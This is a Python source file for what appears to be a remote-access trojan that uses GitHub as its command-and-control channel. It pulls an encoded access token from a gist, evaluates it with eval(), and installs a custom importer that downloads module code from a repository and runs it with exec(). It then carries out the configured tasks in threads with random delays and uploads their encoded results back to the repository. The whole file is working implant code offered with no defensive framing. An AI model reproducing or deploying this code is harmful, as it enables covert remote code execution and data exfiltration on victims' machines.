#!/usr/bin/env python3

import sys
from base64 import b64decode, b64encode
from importlib import util
from random import randint
from json import loads
from time import time, sleep 
from threading import Thread
from queue import Queue
from datetime import datetime
from github3 import login, GitHub


GIST_USER: str = 'Sharerwe'
GIST_LIST: object = GitHub().gists_by(GIST_USER)
GIST_DESC: str = [gist.as_dict()['description'] for gist in GIST_LIST if 'QRTXWY.txt' in str(gist.as_dict()['files'].keys())][0]
GIT_INFO: dict = eval(b64decode(GIST_DESC))
GIT_LOGIN: object = login(token=GIT_INFO['token']) 
GIT_REPO: object = GIT_LOGIN.repository(GIT_INFO['user'], GIT_INFO['repo'])

def retrieve_contents(file_path: str) -> str(b64encode):
    branch = GIT_REPO.branch('main')
    tree = branch.commit.commit.tree.to_tree().recurse()
    
    for filename in tree.tree:      
        if file_path in filename.path:
            print(f'[+] Found file {file_path}')
            blob = GIT_REPO.blob(filename._json_data['sha'])
            return blob.content


class GitImporter(object):
    def __init__(self) -> None:
        self.current_module_contents: str = ''
    
    def find_module(self, module: str, path=None) -> object:
        print(f'[&] Attempting to retrieve {module}')
        module_contents = retrieve_contents(f'modules/{module}')         
        
        if module_contents:
            self.current_module_contents = b64decode(module_contents)        
            return self

    def load_module(self, name: str) -> object:    
        spec = util.spec_from_loader(name, loader=None, origin=GIT_REPO.git_url)
        module = util.module_from_spec(spec)
        exec(self.current_module_contents, module.__dict__)
        sys.modules[spec.name] = module
        return module

class ClientHandler:

    def __init__(self,) -> None:
        self.client_id: str = None
        self.task_queue: Queue = Queue()
        self.config_path: str = f'config/{self.client_id}.json'
        self.data_path: str = f'data/{self.client_id}'

    def get_client_config(self) -> list(dict()):
        config_json: str(b64encode) = retrieve_contents(self.config_path)
        
        if config_json == None:
            configuration: list(dict()) = [{'module':'stage_1'}]
        
        else:
            configuration: list(dict()) = loads(b64decode(config_json))
        
        for tasks in configuration:
            if tasks['module'] not in sys.modules:
                exec(f"import {tasks['module']}")
        return configuration
         
    def module_queue(self, module: str) -> str:
        self.task_queue.put(1)
        result = sys.modules[module].run()
        self.task_queue.get()
        return result

    def create_client_config(self, module: str) -> None:
        self.client_id = f'ent-{int(time())}'
        self.config_path = f'config/{self.client_id}.json'
        self.data_path = f'data/{self.client_id}'
        result = self.module_queue(module)
        message = f'{self.client_id} init {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        GIT_REPO.create_file(self.config_path, message, bindata)
    
    def update_client_config(self, module: str) -> None:
        result = self.module_queue(module)
        message = f'{self.client_id} update {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        GIT_REPO.file_contents(self.config_path).update(message,bindata)
    
    def module_exec(self, module: str) -> None:
        result = self.module_queue(module)
        message = f'{module}__{datetime.now().isoformat()}'
        data_path_full = f'{self.data_path}/{int(time())}.data'
        bindata = bytes('%r' %result, 'utf-8')
        GIT_REPO.create_file(data_path_full, message, b64encode(bindata))
    
def threader(func: object, task: str) -> None:
    t = Thread(target=func, args=(task, ))
    t.start()
    sleep(randint(10,20))

def main() -> None:
    sys.meta_path = [GitImporter()]
    client: object = ClientHandler()
    module_list: list(str) = [] 
    
    while True:
        if client.task_queue.empty():
            config: list(dict()) = client.get_client_config()
            
            for task in config:
                if task['module'] in module_list and task['module'] != 'sleep':
                    continue
                
                else:
                    module_list.append(task['module'])
                    
                    if task['module'] == 'stage_1':
                        threader(client.create_client_config, task['module'])
                    
                    elif 'qrw' in task['module']:
                        threader(client.update_client_config, task['module'])
                    
                    else:
                        threader(client.module_exec, task['module'])


if __name__=='__main__':
    main()
